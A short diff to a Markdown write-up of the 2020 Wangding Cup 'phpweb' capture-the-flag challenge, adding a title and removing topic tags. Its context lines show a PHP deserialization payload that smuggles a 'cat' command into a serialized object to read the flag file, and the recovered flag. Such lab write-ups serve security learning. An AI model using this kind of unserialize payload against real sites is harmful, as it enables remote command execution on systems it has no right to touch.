@@ -1,3 +1,4 @@
+# [网鼎杯 2020 朱雀组]phpweb
 ![](<./img/Pasted image 20221113204640.png>)
 
 ---
@@ -131,5 +132,3 @@ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func
 ```
 flag{3b352024-0ec2-4ac3-a110-9cbd86917b0c}
 ```
-
-#Web #PHP #反序列化 #RCE
